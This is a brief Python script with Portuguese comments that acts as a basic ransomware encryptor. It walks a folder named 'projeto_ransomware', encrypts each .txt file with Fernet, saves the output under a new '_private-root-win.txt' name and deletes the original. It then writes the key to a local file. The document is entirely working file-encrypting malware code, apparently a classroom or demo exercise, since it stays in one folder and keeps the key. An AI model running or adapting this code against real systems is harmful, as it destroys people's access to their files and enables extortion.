import os
from cryptography.fernet import Fernet

# Gerar uma chave de criptografia
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Pasta onde os arquivos .txt estão localizados
pasta = "projeto_ransomware"

# Função para criptografar arquivos
def criptografar_arquivos(pasta):
    for root, dirs, files in os.walk(pasta):
        for file in files:
            if file.endswith(".txt"):
                caminho_completo = os.path.join(root, file)
                with open(caminho_completo, "rb") as f:
                    dados = f.read()
                dados_criptografados = cipher_suite.encrypt(dados)
                novo_nome = file.replace(".txt", "_private-root-win.txt")
                novo_caminho = os.path.join(root, novo_nome)
                with open(novo_caminho, "wb") as f:
                    f.write(dados_criptografados)
                os.remove(caminho_completo)

# Criptografar os arquivos na pasta
criptografar_arquivos(pasta)

# Salvar a chave em um arquivo para uso posterior na descriptografia
with open("chave_privada.key", "wb") as key_file:
    key_file.write(key)

print("Arquivos criptografados com sucesso!")
